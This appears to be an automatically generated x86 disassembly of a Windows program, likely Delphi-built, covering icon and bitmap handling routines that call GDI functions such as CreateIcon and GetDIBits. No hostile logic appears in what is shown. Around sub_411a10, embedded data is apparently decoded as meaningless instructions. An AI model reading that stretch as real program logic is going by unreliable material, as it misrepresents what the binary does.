jg r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x1c ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov al 0x1
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
sub_410d70
push ebp
mov ebp esp
add esp 0xffffff74
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4460c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4110ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
or eax [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_410e65
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xe
mov eax [ ebp - 0x34 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x34 ]
push eax
call GetDeviceCaps
imul bx ax
mov [ ebp - 0x1a ] bx
cmp [ ebp - 0x1a ] 0x8
jbe r-xdata
call sub_41006c
push 0x0
call GetDC
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov cx [ ebp - 0x1a ]
mov eax 0x1
shl eax cl
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x20 ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e6c
mov eax [ ebp - 0x34 ]
push eax
push 0x0
call ReleaseDC
retn
sub_410e6c
xor eax eax
mov [ ebp - 0x30 ] eax
push ebp
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_410c9c
pop ecx
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0xc ]
dec eax
test eax eax
jle r-xdata
mov eax [ ebp - 0x30 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x5c ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x5c ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x5c ]
mov eax [ eax + 0x8 ]
call sub_4460c4
mov [ ebp - 0x38 ] eax
xor eax eax
push ebp
push sub_41108c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x5c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x5c ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x38 ]
call sub_410ad8
lea eax [ ebp - 0x8c ]
push eax
push 0x18
mov eax [ ebp - 0x44 ]
push eax
call GetObjectA
lea eax [ ebp - 0x74 ]
push eax
push 0x18
mov eax [ ebp - 0x40 ]
push eax
call GetObjectA
mov eax [ ebp - 0x80 ]
imul [ ebp - 0x84 ]
movzx edx [ ebp - 0x7c ]
imul edx
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x68 ]
imul [ ebp - 0x6c ]
movzx edx [ ebp - 0x64 ]
imul edx
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x54 ]
add eax [ ebp - 0x50 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4460c4
mov [ ebp - 0x3c ] eax
xor eax eax
push ebp
push sub_411069
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x3c ]
add eax [ ebp - 0x54 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x44 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x40 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x40 ]
push eax
call DeleteObject
mov eax [ ebp - 0x44 ]
push eax
call DeleteObject
mov eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4c ]
push eax
mov al [ ebp - 0x62 ]
push eax
mov al [ ebp - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411070
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x3c ]
call sub_44ba74
retn
call sub_4100c0
inc [ ebp - 0x2c ]
dec [ ebp - 0x58 ]
jne r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
push ebp
mov eax [ ebp - 0x2c ]
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_410c9c
pop ecx
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
push ebp
mov eax [ ebp - 0x2c ]
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x30 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_410cc4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
sub_4110bc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0xc ]
mov ax [ eax ]
xor [ ebp - 0x6 ] ax
add [ ebp - 0xc ] 0x2
mov ax [ ebp - 0x6 ]
mov esp ebp
pop ebp
retn
sub_4110fc
push ebp
mov ebp esp
add esp 0xffffff9c
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x40
jl r-xdata
call sub_410048
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov edx 0x28
call sub_44bd90
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x28
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x60 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x8 ] edx
cmp [ ebp - 0x4c ] 0x28
jb r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edi eax
lea esi [ ebp - 0x4c ]
mov ecx 0xa
[ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x20 ]
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xe ] 0x4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
jmp r-xdata
sub eax 0xf0
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xe ] 0x8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
jmp r-xdata
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_410338
mov ecx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x14 ] ecx
mov ax [ ebp - 0x52 ]
imul [ ebp - 0x54 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xe ] ax
sub_411230
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4110fc
cmp [ ebp - 0x26 ] 0x8
jbe r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x28
test [ ebp - 0x24 ] 0x3
je r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0x2
add eax 0x28
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov cx [ ebp - 0x26 ]
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
add [ eax ] 0xc
jmp r-xdata
sub_4112a8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_411230
mov esp ebp
pop ebp
retn
sub_4112cc
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4110fc
xor eax eax
mov [ ebp - 0x14 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_411379
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0xd ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411380
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectPalette
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
push eax
call RealizePalette
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectPalette
sub_41138c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4112cc
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x4
sub_4113d8
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x32 ]
xor ecx ecx
mov edx 0x6
call sub_44bd90
lea eax [ ebp - 0x64 ]
xor ecx ecx
mov edx 0x10
call sub_44bd90
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetIconInfo
call sub_4113c0
xor eax eax
push ebp
push sub_4115e5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x48 ]
call sub_411230
push 0x10
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x44 ]
call sub_411230
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_4115be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_4460c4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x18 ]
call sub_4460c4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_4460c4
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x1c ]
call sub_4460c4
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
push eax
push 0x2
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x48 ]
call sub_4112cc
mov eax [ ebp - 0x2c ]
push eax
push 0x10
mov ecx [ ebp - 0x28 ]
xor edx edx
mov eax [ ebp - 0x44 ]
call sub_4112cc
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x2e ] 0x1
lea edx [ ebp - 0x32 ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov al [ eax + 0x4 ]
mov [ ebp - 0x64 ] al
mov eax [ ebp - 0x3c ]
mov al [ eax + 0x8 ]
mov [ ebp - 0x63 ] al
mov eax [ ebp - 0x3c ]
mov ax [ eax + 0xc ]
mov edx [ ebp - 0x3c ]
imul [ edx + 0xe ]
mov [ ebp - 0x62 ] ax
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] 0x16
lea edx [ ebp - 0x64 ]
mov ecx 0x10
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x40 ]
add [ edx + 0x8 ] eax
mov edx [ ebp - 0x28 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4115c5
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
call sub_44ba74
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x2c ]
call sub_44ba74
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_44ba74
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
call sub_44ba74
retn
mov eax [ ebp - 0x14 ]
add eax 0x16
add eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x38 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_4115c5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4115ec
mov eax [ ebp - 0x44 ]
push eax
call DeleteObject
mov eax [ ebp - 0x48 ]
push eax
call DeleteObject
retn
sub_4115f4
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_411638
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_411668
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
mov al [ ebp - 0x1 ]
pop ecx
pop ebp
retn
xor eax eax
jmp r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_4116cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_411668
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_411718
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44bfb8
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_44bfb8
cmp ebx eax
je r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_411853
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_411836
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x10 ]
call sub_43eac4
mov ebx eax
mov eax [ ebp - 0x14 ]
call sub_43eac4
cmp ebx eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_43eac4
mov ecx eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
call sub_4461ec
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41183d
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
mov al 0x1
sub_411898
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x20
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43eda4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4118e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4118ee
mov eax [ ebp - 0xc ]
call sub_44c070
retn
sub_4118f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_411934
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
pop ecx
pop ecx
pop ebp
retn
sub_411950
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0xffff
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43eda4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4119a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4119a9
mov eax [ ebp - 0xc ]
call sub_44c070
retn
sub_4119c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x19 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x19 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4119f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop ecx
pop ecx
pop ebp
retn
sub_411a10
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
pushad
enter 0x43 0xbc
retn 0x43
popad
je r-xdata
xchg ebp eax
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax + 0x1a849090 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx + 0x100041 ] dl
add [ eax ] al
pop eax
stosd [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x1c ] 0x1b
inc ecx
add [ esp + eax * 8 - 0x379fffbd ] ch
inc ebx
add [ edx + eax * 8 - 0x3c87ffbd ] bh
inc ebx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
xchg ebp eax
inc esp
add [ eax + eax ] al
add [ eax ] al
xor [ ebp + 0x80044 ] dl
add [ eax ] al
nop
nop
nop
test [ edx ] bl
enter 0x3 0x8b
dec ebp
dec esp
imul esi [ ebx + 0x74 ] 0x55909090
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_411b8c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b93
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_44cb04
retn
add esp 0xfffffff0
call sub_44c370
sub_411aa8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_411b8c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
push 0x0
